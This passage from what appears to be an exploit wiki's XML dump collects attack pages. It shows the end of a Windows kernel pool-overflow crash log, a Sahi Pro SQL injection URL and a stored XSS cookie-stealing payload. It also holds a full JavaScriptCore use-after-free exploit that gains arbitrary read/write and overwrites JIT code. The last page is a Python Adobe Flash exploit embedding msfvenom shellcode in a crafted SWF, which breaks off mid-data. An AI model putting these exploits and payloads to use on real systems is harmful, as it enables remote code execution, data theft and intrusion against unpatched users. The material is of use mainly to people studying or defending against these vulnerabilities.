85a6ce00  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA    &lt;================ Evil user input 
85a6ce10  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
85a6ce20  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
85a6ce30  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
85a6ce40  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
85a6ce50  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
85a6ce60  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
85a6ce70  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
1: kd&gt; g

*** Fatal System Error: 0x00000019
                       (0x00000020,0x892CF250,0x892CF260,0x08020012)

Break instruction exception - code 80000003 (first chance)

A fatal system error has occurred.
Debugger entered on first try; Bugcheck callbacks have not been invoked.

A fatal system error has occurred.

1: kd&gt; !analyze -v

*******************************************************************************
*                                                                             *
*                        Bugcheck Analysis                                    *
*                                                                             *
*******************************************************************************


BAD_POOL_HEADER (19)
The pool is already corrupt at the time of the current request.
This may or may not be due to the caller.
The internal pool links must be walked to figure out a possible cause of
the problem, and then special pool applied to the suspect tags or the driver
verifier to a suspect driver.
Arguments:
Arg1: 00000020, a pool block header size is corrupt.
Arg2: 892cf250, The pool entry we were looking for within the page.
Arg3: 892cf260, The next pool entry.
Arg4: 08020012, (reserved






3. Solution:
   
None


&lt;/pre&gt;</text>
      <sha1>4p5a19brjc4vxetqyel0cnu5q2wn8y6</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2018-20469 Sahi pro 8.x SQL注入漏洞</title>
    <ns>0</ns>
    <id>1607</id>
    <revision>
      <id>2010</id>
      <timestamp>2021-05-02T04:30:51Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==EXP== &lt;pre&gt; # Exploit Title: Sahi pro ( &lt;= 8.x ) sensitive information disclosure by SQL injection. # Date: 17-06-2019 # Exploit Author: Goutham Madhwaraj ( https://barriers..."</comment>
      <origin>2010</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="1199" sha1="qm0x5iygsask7bexq0klogf28sj4137" xml:space="preserve">==EXP==
&lt;pre&gt;
# Exploit Title: Sahi pro ( &lt;= 8.x ) sensitive information disclosure by SQL injection.
# Date: 17-06-2019
# Exploit Author: Goutham Madhwaraj ( https://barriersec.com )
# Vendor Homepage: https://sahipro.com/
# Software Link: https://sahipro.com/downloads-archive/
# Version: 7.x , &lt;= 8.x
# Tested on: Windows 10
# CVE : CVE-2018-20469
# POC-URL : https://barriersec.com/2019/06/cve-2018-20469-sahi-pro/

Description :

An issue was discovered in Tyto Sahi Pro through 7.x.x and 8.0.0. A parameter in the web reports module is vulnerable to SQL injection. This can be exploited to inject SQL queries and run standard h2 system functions.


POC :

vulnerable URL :

''' replace the ip and port of the remote sahi pro server machine '''


# here sql query is passed directly as part of GET request which can be modified to run standard h2 database functions. in the following POC , "memory_used()" function is injected , which is reflected in "status" column of reports page.

http://&lt;ip&gt;:&lt;port&gt;/_s_/dyn/pro/DBReports?sql=SELECT DISTINCT memory_used() AS ROWSTATUS, SCRIPTREPORTS.SCRIPTREPORTID,SCRIPTREPORTS.SCRIPTNAME,SUITEREPORTS.* FROM SUITEREPORTS,SCRIPTREPORTS
            
&lt;/pre&gt;</text>
      <sha1>qm0x5iygsask7bexq0klogf28sj4137</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2018-20472 Sahi pro 8.x XSS漏洞</title>
    <ns>0</ns>
    <id>1606</id>
    <revision>
      <id>2009</id>
      <timestamp>2021-05-02T04:29:46Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==XSS== &lt;pre&gt; # Exploit Title: Sahi pro ( &lt;= 8.x ) Stored XSS # Date: 17-06-2019 # Exploit Author: Goutham Madhwaraj ( https://barriersec.com ) # Vendor Homepage: https://sahi..."</comment>
      <origin>2009</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="1147" sha1="9nt93a0xdrpvfosfdvqvq15i9ymzdoa" xml:space="preserve">==XSS==
&lt;pre&gt;
# Exploit Title: Sahi pro ( &lt;= 8.x ) Stored XSS
# Date: 17-06-2019
# Exploit Author: Goutham Madhwaraj ( https://barriersec.com )
# Vendor Homepage: https://sahipro.com/
# Software Link: https://sahipro.com/downloads-archive/
# Version: 7.x , &lt;= 8.x
# Tested on: Windows 10
# CVE : CVE-2018-20472
# POC-URL : https://barriersec.com/2019/06/cve-2018-20472-sahi-pro/

DESCRIPTION :

An issue was discovered in Tyto Sahi Pro through 7.x.x and 8.0.0. The logs web interface is vulnerable to stored XSS. Description parameter of Testcase API can be used to exploit the stored XSS.


POC :

step 1 :

 create a sahi test automation script with the following content and save the file with ".sah" extension ( example : poc.sah) :

            var $tc1 = _testcase(“TC-1″,”&lt;script&gt;alert(document.cookie)&lt;/script&gt;”).start();

           _log(“testing stored XSS injection”);

            $tc1.end();

Step 2 :

Execute the created script ( poc.sah ) using sahi GUI controller .

Step 3 : navigate to the web logs console ( http://&lt;ip&gt;:&lt;port&gt;/logs ) using the browser for the executed script. XSS is triggered .
            
&lt;/pre&gt;</text>
      <sha1>9nt93a0xdrpvfosfdvqvq15i9ymzdoa</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2018-4192 JavaScript Core任意代碼執行漏洞</title>
    <ns>0</ns>
    <id>549</id>
    <revision>
      <id>755</id>
      <timestamp>2021-03-29T14:28:50Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==EXP== &lt;pre&gt; // Load Int library, thanks saelo! load('util.js'); load('int64.js');     // Helpers to convert from float to in a few random places var conva = new ArrayBuffer(..."</comment>
      <origin>755</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="9575" sha1="miy3yqv447rlwxl7sulredrmye27xxc" xml:space="preserve">==EXP==
&lt;pre&gt;
// Load Int library, thanks saelo!
load('util.js');
load('int64.js');
 
 
// Helpers to convert from float to in a few random places
var conva = new ArrayBuffer(8);
var convf = new Float64Array(conva);
var convi = new Uint32Array(conva);
var convi8 = new Uint8Array(conva);
 
var floatarr_magic = new Int64('0x3131313131313131').asDouble();
var floatarr_magic = new Int64('0x3131313131313131').asDouble();
var jsval_magic = new Int64('0x3232323232323232').asDouble();
 
var structs = [];
 
function log(x) {
    print(x);
}
 
// Look OOB for array we can use with JSValues
function findArrayOOB(corrupted_arr, groom) {
    log("Looking for JSValue array with OOB Float array");
    for (let i = 0; i&lt;corrupted_arr.length; i++) {
        convf[0] = corrupted_arr[i];
 
        // Find the magic value we stored in the JSValue Array
        if (convi[0] == 0x10) {
            convf[0] = corrupted_arr[i+1];
            if (convi[0] != 0x32323232)
                continue;
 
            // Change the first element of the array
            corrupted_arr[i+1] = new Int64('0x3131313131313131').asDouble();
 
            let target = null;
            // Find which array we modified
            for (let j = 0; j&lt;groom.length; j++) {
                if (groom[j][0] != jsval_magic) {
                    target = groom[j];
                    break
                }
            }
 
            log("Found target array for addrof/fakeobj");
 
            // This object will hold our primitives
            let prims = {};
 
            let oob_ind = i+1;
 
            // Get the address of a given jsobject
            prims.addrof = function(x) {
                // To do this we put the object in the jsvalue array and
                // access it OOB with our float array
                target[0] = x;
                return Int64.fromDouble(corrupted_arr[oob_ind]);
            }
 
            // Return a jsobject at a given address
            prims.fakeobj = function(addr) {
                // To do this we overwrite the first slot of the jsvalue array
                // with the OOB float array
                corrupted_arr[oob_ind] = addr.asDouble();
                return target[0];
            }
 
            return prims;
        }
    }
}
 
// Here we will spray structure IDs for Float64Arrays
// See http://www.phrack.org/papers/attacking_javascript_engines.html
function sprayStructures() {
  function randomString() {
      return Math.random().toString(36).replace(/[^a-z]+/g, '').substr(0, 5);
  }
  // Spray arrays for structure id
  for (let i = 0; i &lt; 0x1000; i++) {
      let a = new Float64Array(1);
      // Add a new property to create a new Structure instance.
      a[randomString()] = 1337;
      structs.push(a);
  }
}
 
 
// Here we will create our fake typed array and get arbitrary read/write
// See http://www.phrack.org/papers/attacking_javascript_engines.html
function getArb(prims) {
    sprayStructures()
 
    let utarget = new Uint8Array(0x10000);
    utarget[0] = 0x41;
 
    // Our fake array
    // Structure id guess is 0x200
    // [ Indexing type = 0 ][ m_type = 0x27 (float array) ][ m_flags = 0x18 (OverridesGetOwnPropertySlot) ][ m_cellState = 1 (NewWhite)]
    let jscell = new Int64('0x0118270000000200');
 
    // Construct the object
    // Each attribute will set 8 bytes of the fake object inline
    obj = {
        'a': jscell.asDouble(),
 
        // Butterfly can be anything
        'b': false,
 
        // Target we want to write to
        'c': utarget,
 
        // Length and flags
        'd': new Int64('0x0001000000000010').asDouble()
    };
 
 
    // Get the address of the values we stored in obj
    let objAddr = prims.addrof(obj).add(16);
    log("Obj addr + 16 = "+objAddr);
 
    // Create a fake object from this pointer
    let fakearray = prims.fakeobj(objAddr);
 
    // Attempt to find a valid ID for our fake object
    while(!(fakearray instanceof Float64Array)) {
        jscell.add(1);
        obj['a'] = jscell.asDouble();
    }
 
    log("Matched structure id!");
 
    // Set data at a given address
    prims.set = function(addr, arr) {
        fakearray[2] = addr.asDouble();
        utarget.set(arr);
    }
 
    // Read 8 bytes as an Int64 at a given address
    prims.read64 = function(addr) {
        fakearray[2] = addr.asDouble();
        let bytes = Array(8);
        for (let i=0; i&lt;8; i++) {
            bytes[i] = utarget[i];
        }
        return new Int64(bytes);
    }
 
    // Write an Int64 as 8 bytes at a given address
    prims.write64 = function(addr, value) {
        fakearray[2] = addr.asDouble();
        utarget.set(value.bytes);
    }
}
 
// Here we will use build primitives to eventually overwrite the JIT page
function exploit(corrupted_arr, groom) {
    save.push(groom);
    save.push(corrupted_arr);
 
    // Create fakeobj and addrof primitives
    let prims = findArrayOOB(corrupted_arr, groom);
 
    // Upgrade to arb read/write from OOB read/write
    getArb(prims);
 
    // Build an arbitrary JIT function
    // This was basically just random junk to make the JIT function larger
    let jit = function(x) {
        var j = []; j[0] = 0x6323634;
        return x*5 + x - x*x /0x2342513426 +(x - x+0x85720642 *(x +3 -x / x+0x41424344)/0x41424344)+j[0]; };
 
    // Make sure the JIT function has been compiled
    jit();
    jit();
    jit();
 
    // Traverse the JSFunction object to retrieve a non-poisoned pointer
    log("Finding jitpage");
    let jitaddr = prims.read64(
        prims.read64(
            prims.read64(
                prims.read64(
                    prims.addrof(jit).add(3*8)
                ).add(3*8)
            ).add(3*8)
        ).add(5*8)
    );
    log("Jit page addr = "+jitaddr);
 
    // Overwrite the JIT code with our INT3s
    log("Writting shellcode over jit page");
    prims.set(jitaddr.add(32), [0xcc, 0xcc, 0xcc, 0xcc]);
 
    // Call the JIT function, triggering our INT3s
    log("Calling jit function");
    jit();
 
    throw("JIT returned");
}
 
 
// Find and set the length of a non-freed butterfly with our unstable OOB primitive
function setLen(uaf_arr, ind) {
    let f=0;
    for (let i=0; i&lt;uaf_arr.length; i++) {
        convf[0] = uaf_arr[i];
 
        // Look for a new float array, and set the length
        if (convi[0] == 0x10) {
            convf[0] = uaf_arr[i+1];
            if (convi[0] == 0x32323232 &amp;&amp; convi[1] == 0x32323232) {
                convi[0] = 0x42424242;
                convi[1] = 0x42424242;
                uaf_arr[i] = convf[0];
                return;
            }
        }
    }
 
    throw("Could not find anouther array to corrupt");
}
 
 
let oob_rw_unstable = null;
let oob_rw_unstable_ind = null;
let oob_rw_stable = null;
 
// After this point we would stop seeing GCs happen enough to race :(
const limit = 10;
const butterfly_size = 32
 
let save = [0, 0]
 
for(let at = 0; at &lt; limit; at++) {
    log("Trying to race GC and array.reverse() Attempt #"+(at+1));
 
    // Allocate the initial victim and target arrays
    let victim_arrays = new Array(2048);
    let groom  = new Array(2048);
    for (let i=0; i&lt;victim_arrays.length; i++) {
        victim_arrays[i] = new Array(butterfly_size).fill(floatarr_magic)
        groom[i] = new Array(butterfly_size/2).fill(jsval_magic)
    }
 
    let vv = [];
    let  v = []
 
    // Allocate large strings to trigger the GC while calling reverse
    for (let i = 0; i &lt; 506; i++) {
        for(let j = 0; j &lt; 0x100; j++) {
            // Cause GCs to trigger while we are racing with reverse
            if (j == 0x44) { v.push(new String("B").repeat(0x10000*save.length/2)) }
            victim_arrays.reverse()
        }
    }
 
    for (let i = 0; i &lt; victim_arrays.length; i++) {
 
        // Once we see we have replaced a free'd butterfly
        // fill the replacing array with 0x41414141... to smash rest
        // of UAF'ed butterflies
 
        // We know the size will be 506, because it will have been replaced with v
        // we were pushing into in the loop above
 
        if(victim_arrays[i].length == 506) {
            victim_arrays[i].fill(2261634.5098039214)
        }
 
        // Find the first butterfly we have smashed
        // this will be an unstable OOB r/w
 
        if(victim_arrays[i].length == 0x41414141) {
            oob_rw_unstable = victim_arrays[i];
            oob_rw_unstable_ind = i;
            break;
        }
    }
 
    // If we successfully found a smashed and still freed butterfly
    // use it to corrupt a non-freed butterfly for stability
 
    if(oob_rw_unstable) {
 
        setLen(oob_rw_unstable, oob_rw_unstable_ind)
 
        for (let i = 0; i &lt; groom.length; i++) {
            // Find which array we just corrupted
            if(groom[i].length == 0x42424242) {
                oob_rw_stable = groom[i];
                break;
            }
        }
        if (!oob_rw_stable) {
            throw("Groom seems to have failed :(");
        }
    }
 
    // chew CPU to avoid a segfault and help with gc schedule
    for (let i = 0; i &lt; 0x100000; i++) { }
 
 
    // Attempt to clean up some
    let f = []
    for (let i = 0; i &lt; 0x2000; i++) {
        f.push(new Array(16).fill(2261634.6098039214))
    }
 
    save.push(victim_arrays)
    save.push(v)
    save.push(f)
    save.push(groom)
 
    if (oob_rw_stable) {
        log("Found stable corrupted butterfly! Now the fun begins...");
        exploit(oob_rw_stable, groom);
        break;
    }
 
}
throw("Failed to find any UAF'ed butterflies");



&lt;/pre&gt;</text>
      <sha1>miy3yqv447rlwxl7sulredrmye27xxc</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2018-4878 Adobe Flash 28.0.0.137 遠程代碼執行漏洞</title>
    <ns>0</ns>
    <id>1221</id>
    <revision>
      <id>1526</id>
      <timestamp>2021-04-11T02:05:04Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==EXP== &lt;pre&gt; #!/usr/bin/env python # coding: UTF-8 import BaseHTTPServer import sys from SimpleHTTPServer import SimpleHTTPRequestHandler  print "@Syfi2k" print "[+] CVE-2018..."</comment>
      <origin>1526</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="61966" sha1="gv58vxvucxr2o36pzxxiwmgbkgznhl0" xml:space="preserve">==EXP==
&lt;pre&gt;
#!/usr/bin/env python
# coding: UTF-8
import BaseHTTPServer
import sys
from SimpleHTTPServer import SimpleHTTPRequestHandler

print "@Syfi2k"
print "[+] CVE-2018-4878 poc "
print "--------------------------------"
print "Calc.exe Shellcode via Msfvenom"
print "Based on fixed version https://github.com/anbai-inc/CVE-2018-4878"
print "No Crash without executing the Shellcode, Sandbox? try it yourself"


buf =  ""
buf += "\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b"
buf += "\x50\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7"
buf += "\x4a\x26\x31\xff\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf"
buf += "\x0d\x01\xc7\xe2\xf2\x52\x57\x8b\x52\x10\x8b\x4a\x3c"
buf += "\x8b\x4c\x11\x78\xe3\x48\x01\xd1\x51\x8b\x59\x20\x01"
buf += "\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b\x01\xd6\x31"
buf += "\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03\x7d"
buf += "\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66"
buf += "\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0"
buf += "\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f"
buf += "\x5f\x5a\x8b\x12\xeb\x8d\x5d\x6a\x01\x8d\x85\xb2\x00"
buf += "\x00\x00\x50\x68\x31\x8b\x6f\x87\xff\xd5\xbb\xf0\xb5"
buf += "\xa2\x56\x68\xa6\x95\xbd\x9d\xff\xd5\x3c\x06\x7c\x0a"
buf += "\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x53"
buf += "\xff\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00"
 
payload = buf
data = ""
flash_name = "movie"
 


data = "\x46\x57\x53\x20\xE3\x45\x00\x00\x78\x00\x04\xE2\x00\x00\x0E\xA6\x00\x00\x18\x01\x00\x44\x11\x19\x00\x00\x00\x7F\x13\x1F\x02\x00\x00\x3C\x72\x64\x66\x3A\x52\x44\x46\x20\x78\x6D\x6C\x6E\x73\x3A\x72\x64\x66\x3D\x22\x68\x74\x74\x70\x3A\x2F\x2F\x77\x77\x77\x2E\x77\x33\x2E\x6F\x72\x67\x2F\x31\x39\x39\x39\x2F\x30\x32\x2F\x32\x32\x2D\x72\x64\x66\x2D\x73\x79\x6E\x74\x61\x78\x2D\x6E\x73\x23\x22\x3E\x0D\x0A\x20\x20\x20\x20\x3C\x72\x64\x66\x3A\x44\x65\x73\x63\x72\x69\x70\x74\x69\x6F\x6E\x20\x78\x6D\x6C\x6E\x73\x3A\x64\x63\x3D\x22\x68\x74\x74\x70\x3A\x2F\x2F\x70\x75\x72\x6C\x2E\x6F\x72\x67\x2F\x64\x63\x2F\x65\x6C\x65\x6D\x65\x6E\x74\x73\x2F\x31\x2E\x31\x22\x20\x72\x64\x66\x3A\x61\x62\x6F\x75\x74\x3D\x22\x22\x3E\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x3C\x64\x63\x3A\x66\x6F\x72\x6D\x61\x74\x3E\x61\x70\x70\x6C\x69\x63\x61\x74\x69\x6F\x6E\x2F\x78\x2D\x73\x68\x6F\x63\x6B\x77\x61\x76\x65\x2D\x66\x6C\x61\x73\x68\x3C\x2F\x64\x63\x3A\x66\x6F\x72\x6D\x61\x74\x3E\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x3C\x64\x63\x3A\x74\x69\x74\x6C\x65\x3E\x41\x64\x6F\x62\x65\x20\x46\x6C\x65\x78\x20\x34\x20\x41\x70\x70\x6C\x69\x63\x61\x74\x69\x6F\x6E\x3C\x2F\x64\x63\x3A\x74\x69\x74\x6C\x65\x3E\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x3C\x64\x63\x3A\x64\x65\x73\x63\x72\x69\x70\x74\x69\x6F\x6E\x3E\x68\x74\x74\x70\x3A\x2F\x2F\x77\x77\x77\x2E\x61\x64\x6F\x62\x65\x2E\x63\x6F\x6D\x2F\x70\x72\x6F\x64\x75\x63\x74\x73\x2F\x66\x6C\x65\x78\x3C\x2F\x64\x63\x3A\x64\x65\x73\x63\x72\x69\x70\x74\x69\x6F\x6E\x3E\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x3C\x64\x63\x3A\x70\x75\x62\x6C\x69\x73\x68\x65\x72\x3E\x75\x6E\x6B\x6E\x6F\x77\x6E\x3C\x2F\x64\x63\x3A\x70\x75\x62\x6C\x69\x73\x68\x65\x72\x3E\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x3C\x64\x63\x3A\x63\x72\x65\x61\x74\x6F\x72\x3E\x75\x6E\x6B\x6E\x6F\x77\x6E\x3C\x2F\x64\x63\x3A\x63\x72\x65\x61\x74\x6F\x72\x3E\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x3C\x64\x63\x3A\x6C\x61\x6E\x67\x75\x61\x67\x65\x3E\x45\x4E\x3C\x2F\x64\x63\x3A\x6C\x61\x6E\x67\x75\x61\x67\x65\x3E\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x3C\x64\x63\x3A\x64\x61\x74\x65\x3E\x46\x65\x62\x20\x36\x2C\x20\x32\x30\x31\x38\x3C\x2F\x64\x63\x3A\x64\x61\x74\x65\x3E\x0D\x0A\x20\x20\x20\x20\x3C\x2F\x72\x64\x66\x3A\x44\x65\x73\x63\x72\x69\x70\x74\x69\x6F\x6E\x3E\x20\x3C\x2F\x72\x64\x66\x3A\x52\x44\x46\x3E\x0D\x0A\x00\xD0\x0F\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x44\x10\xE8\x03\x3C\x00\x43\x02\xFF\xFF\xFF\xC8\x0A\x66\x6C\x61\x73\x68\x30\x32\x00\xFF\x15\x82\x0B\x00\x00\x02\x00\x00\x00\x00\x00"
 

filler = 2940 - len(payload)
 
data = data + payload + "\x90" * filler


data = data + "\x13\x0E\x01\x00\x02\x00\x73\x68\x65\x6C\x6C\x63\x6F\x64\x42\x79\x74\x65\x73\x00\x00\xBF\x14\xB6\x06\x00\x00\x01\x00\x00\x00\x4D\x61\x69\x6E\x45\x78\x70\x00\x10\x00\x2E\x00\x02\x00\x28\x8E\xCD\xBD\x06\xAD\xCA\x75\x8F\xCD\xBD\x06\xAE\xE4\xE0\x03\x8E\xCD\xBD\x06\xFC\xE2\x75\x8E\xCD\xBD\x06\xFE\xF0\x75\x8E\xCD\xBD\x06\xF8\xF8\x75\x8F\xCD\xBD\x06\xF9\xFE\xA1\x03\x8E\xCD\xBD\x06\xF8\xDE\x75\x89\xCD\xBD\x06\xDC\xB6\xCD\x02\xD6\xF6\x68\x8F\xCD\xBD\x06\xFA\xE6\xCD\x03\x8F\xCD\xBD\x06\xF5\xDC\xA1\x03\x8E\xCD\xBD\x06\xF1\xDC\x74\x8F\xCD\xBD\x06\xD1\xBA\xFD\x02\x8F\xCD\xBD\x06\xEC\xDC\xCD\x03\x8E\xCD\xBD\x06\xEF\xE4\x75\x8E\xCD\xBD\x06\xEE\xF8\x75\x8E\xCD\xBD\x06\xE9\xF0\x75\x89\xCD\xBD\x06\xEE\xE6\xDD\x03\xFF\xD0\x69\x8F\xCD\xBD\x06\xCB\xAA\xC9\x02\x93\xCD\xBD\x06\x00\x55\x07\x4D\x61\x69\x6E\x45\x78\x70\x05\x76\x61\x72\x5F\x31\x00\x0E\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x05\x76\x61\x72\x5F\x32\x0E\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x06\x64\x61\x74\x61\x31\x34\x06\x64\x61\x74\x61\x31\x35\x3C\x43\x3A\x5C\x55\x73\x65\x72\x73\x5C\x4D\x69\x68\x61\x5C\x41\x64\x6F\x62\x65\x4D\x69\x6E\x65\x50\x6F\x43\x5F\x74\x72\x79\x69\x6E\x67\x54\x6F\x45\x76\x61\x64\x65\x53\x65\x63\x53\x6F\x6C\x75\x74\x69\x6F\x6E\x73\x66\x6C\x61\x30\x31\x2E\x61\x73\x05\x64\x61\x74\x61\x32\x05\x64\x61\x74\x61\x33\x09\x42\x79\x74\x65\x41\x72\x72\x61\x79\x0B\x66\x6C\x61\x73\x68\x2E\x75\x74\x69\x6C\x73\x06\x45\x6E\x64\x69\x61\x6E\x0D\x4C\x49\x54\x54\x4C\x45\x5F\x45\x4E\x44\x49\x41\x4E\x06\x65\x6E\x64\x69\x61\x6E\x0C\x43\x61\x70\x61\x62\x69\x6C\x69\x74\x69\x65\x73\x0C\x66\x6C\x61\x73\x68\x2E\x73\x79\x73\x74\x65\x6D\x07\x76\x65\x72\x73\x69\x6F\x6E\x01\x2C\x01\x20\x07\x72\x65\x70\x6C\x61\x63\x65\x21\x68\x74\x74\x70\x3A\x2F\x2F\x61\x64\x6F\x62\x65\x2E\x63\x6F\x6D\x2F\x41\x53\x33\x2F\x32\x30\x30\x36\x2F\x62\x75\x69\x6C\x74\x69\x6E\x05\x73\x70\x6C\x69\x74\x05\x41\x72\x72\x61\x79\x0C\x4D\x61\x69\x6E\x45\x78\x70\x2E\x61\x73\x24\x30\x14\x66\x6C\x61\x73\x68\x2E\x64\x69\x73\x70\x6C\x61\x79\x3A\x53\x70\x72\x69\x74\x65\x24\x66\x6C\x61\x73\x68\x2E\x64\x69\x73\x70\x6C\x61\x79\x3A\x44\x69\x73\x70\x6C\x61\x79\x4F\x62\x6A\x65\x63\x74\x43\x6F\x6E\x74\x61\x69\x6E\x65\x72\x1F\x66\x6C\x61\x73\x68\x2E\x64\x69\x73\x70\x6C\x61\x79\x3A\x49\x6E\x74\x65\x72\x61\x63\x74\x69\x76\x65\x4F\x62\x6A\x65\x63\x74\x1B\x66\x6C\x61\x73\x68\x2E\x64\x69\x73\x70\x6C\x61\x79\x3A\x44\x69\x73\x70\x6C\x61\x79\x4F\x62\x6A\x65\x63\x74\x1C\x66\x6C\x61\x73\x68\x2E\x65\x76\x65\x6E\x74\x73\x3A\x45\x76\x65\x6E\x74\x44\x69\x73\x70\x61\x74\x63\x68\x65\x72\x00\x06\x4E\x75\x6D\x62\x65\x72\x07\x63\x6C\x61\x73\x73\x5F\x31\x05\x76\x61\x72\x5F\x33\x0F\x4D\x61\x69\x6E\x45\x78\x70\x2F\x4D\x61\x69\x6E\x45\x78\x70\x0A\x69\x73\x44\x65\x62\x75\x67\x67\x65\x72\x05\x76\x61\x72\x5F\x34\x07\x66\x6C\x61\x73\x68\x31\x30\x05\x76\x61\x72\x5F\x35\x0F\x4D\x61\x69\x6E\x45\x78\x70\x2F\x66\x6C\x61\x73\x68\x32\x31\x04\x76\x6F\x69\x64\x05\x43\x6C\x61\x73\x73\x17\x5F\x5F\x67\x6F\x5F\x74\x6F\x5F\x64\x65\x66\x69\x6E\x69\x74\x69\x6F\x6E\x5F\x68\x65\x6C\x70\x03\x70\x6F\x73\x03\x33\x36\x34\x03\x34\x36\x33\x03\x34\x39\x38\x03\x35\x33\x37\x03\x31\x39\x39\x03\x32\x32\x39\x03\x69\x6E\x74\x03\x32\x36\x30\x07\x66\x6C\x61\x73\x68\x32\x31\x04\x31\x32\x37\x30\x0D\x66\x6C\x61\x73\x68\x2E\x64\x69\x73\x70\x6C\x61\x79\x06\x53\x70\x72\x69\x74\x65\x06\x4F\x62\x6A\x65\x63\x74\x0F\x45\x76\x65\x6E\x74\x44\x69\x73\x70\x61\x74\x63\x68\x65\x72\x0C\x66\x6C\x61\x73\x68\x2E\x65\x76\x65\x6E\x74\x73\x0D\x44\x69\x73\x70\x6C\x61\x79\x4F\x62\x6A\x65\x63\x74\x11\x49\x6E\x74\x65\x72\x61\x63\x74\x69\x76\x65\x4F\x62\x6A\x65\x63\x74\x16\x44\x69\x73\x70\x6C\x61\x79\x4F\x62\x6A\x65\x63\x74\x43\x6F\x6E\x74\x61\x69\x6E\x65\x72\x1C\x5F\x5F\x67\x6F\x5F\x74\x6F\x5F\x63\x74\x6F\x72\x5F\x64\x65\x66\x69\x6E\x69\x74\x69\x6F\x6E\x5F\x68\x65\x6C\x70\x03\x35\x37\x38\x03\x31\x35\x37\x05\x41\x72\x72\x61\x79\x0B\x66\x6C\x61\x73\x68\x2E\x75\x74\x69\x6C\x73\x09\x42\x79\x74\x65\x41\x72\x72\x61\x79\x21\x68\x74\x74\x70\x3A\x2F\x2F\x61\x64\x6F\x62\x65\x2E\x63\x6F\x6D\x2F\x41\x53\x33\x2F\x32\x30\x30\x36\x2F\x62\x75\x69\x6C\x74\x69\x6E\x09\x77\x72\x69\x74\x65\x42\x79\x74\x65\x08\x74\x6F\x53\x74\x72\x69\x6E\x67\x00\x06\x4F\x62\x6A\x65\x63\x74\x06\x53\x74\x72\x69\x6E\x67\x03\x69\x6E\x74\x04\x06\x07\x06\x07\x06\x6E\x61\x6D\x65\x5F\x32\x06\x6E\x61\x6D\x65\x5F\x31\x0D\x73\x68\x65\x6C\x6C\x63\x6F\x64\x42\x79\x74\x65\x73\x08\x3A\x4D\x61\x69\x6E\x45\x78\x70\x0C\x55\x41\x46\x47\x65\x6E\x65\x72\x61\x74\x6F\x72\x0F\x4D\x61\x69\x6E\x45\x78\x70\x3A\x66\x6C\x61\x73\x68\x32\x31\x10\x3A\x4D\x61\x69\x6E\x45\x78\x70\x2F\x4D\x61\x69\x6E\x45\x78\x70\x3E\x05\x01\x16\x03\x16\x0D\x16\x12\x08\x17\x05\x1A\x17\x03\x18\x01\x1A\x01\x1A\x1B\x1A\x1C\x1A\x1D\x1A\x1E\x1A\x1F\x16\x38\x16\x3C\x17\x4D\x16\x49\x16\x44\x16\x49\x16\x49\x16\x49\x08\x46\x17\x49\x16\x49\x16\x49\x16\x49\x16\x49\x16\x49\x16\x49\x16\x49\x16\x49\x16\x49\x16\x49\x16\x49\x16\x49\x16\x49\x16\x49\x16\x49\x16\x49\x16\x49\x16\x49\x16\x49\x16\x49\x16\x49\x16\x49\x16\x49\x16\x49\x16\x49\x16\x49\x16\x49\x16\x49\x05\x51\x18\x51\x1A\x51\x16\x49\x16\x49\x16\x49\x16\x49\x16\x49\x16\x49\x06\x0C\x01\x02\x05\x06\x07\x08\x09\x0A\x0B\x0C\x0D\x0E\x01\x02\x03\x11\x12\x13\x0C\x01\x12\x17\x06\x18\x08\x09\x0A\x0B\x0C\x0D\x0E\x0C\x12\x17\x18\x0A\x0B\x0C\x0D\x0E\x35\x36\x37\x06\x48\x07\x02\x02\x07\x02\x04\x07\x02\x05\x07\x02\x06\x07\x02\x07\x07\x03\x0C\x07\x03\x0E\x07\x02\x0F\x07\x02\x10\x07\x02\x08\x07\x04\x11\x07\x02\x13\x07\x05\x16\x07\x05\x18\x07\x02\x19\x1B\x01\x07\